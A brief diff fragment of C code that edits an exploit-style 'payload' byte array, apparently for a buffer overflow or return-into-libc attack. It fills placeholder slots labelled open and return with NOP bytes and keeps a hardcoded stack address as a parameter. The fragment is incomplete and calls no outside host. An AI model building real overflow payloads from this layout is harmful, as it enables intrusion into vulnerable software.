@@ -23,8 +23,8 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\x\x\x\x" //<open>
-	"\x\x\x\x"  //<return>
+	"\x90\x90\x90\x90" //<open>
+	"\x90\x90\x90\x90"  //<return>
 	"\x2c\xc3\xff\xbf"; //<first param>
 						//<second param>
 						//<third param>
